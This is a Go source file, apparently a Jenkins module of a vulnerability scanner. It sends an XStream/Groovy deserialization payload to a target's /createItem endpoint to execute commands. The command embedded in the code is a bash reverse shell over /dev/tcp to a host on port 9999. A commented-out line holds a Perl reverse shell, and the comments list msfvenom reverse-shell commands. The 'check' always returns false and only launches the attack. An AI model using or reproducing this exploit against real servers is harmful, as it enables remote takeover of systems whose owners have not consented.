package jenkins

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io"
	"net/url"
	"strings"
)

var Payload = []string{`POST /createItem?name=example HTTP/1.1
Host: %s
Content-Length: %d
Content-Type: application/xml;
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

`, `<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string><![CDATA[%s]]></string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>`}

// https://posts.slayerlabs.com/msfvenom-guide/
// https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/
// msfvenom -p cmd/unix/reverse_perl LHOST=docker.for.mac.localhost LPORT=9999 -f raw
// msfvenom -p cmd/unix/reverse_bash  LHOST=docker.for.mac.localhost LPORT=9
func DoCheck(target string) bool {
	//aCmd := []string{`perl`, `-MIO`, `-e`, `'$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"docker.for.mac.localhost:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`}
	aCmd := []string{`bash`, `-c`, `'0<&29-;exec 29<>/dev/tcp/docker.for.mac.localhost/9999;sh <&29 >&29 2>&29'`}
	if oU, err := url.Parse(target); nil == err {
		szUrl := oU.Scheme + "://" + oU.Host + "/createItem?name=example"
		p2 := fmt.Sprintf(Payload[1], strings.Join(aCmd, "]]></string><string><![CDATA["))
		p1 := fmt.Sprintf(Payload[0], oU.Host, len(p2))
		if "" != p1 {
		}
		if r, err := util.DoPost(szUrl, map[string]string{"Content-Type": "application/xml;", "Connection": "close"}, strings.NewReader(p2)); nil == err {
			if nil != r {
				defer r.Body.Close()
				io.Copy(io.Discard, r.Body)
			}
		}
	}

	return false
}
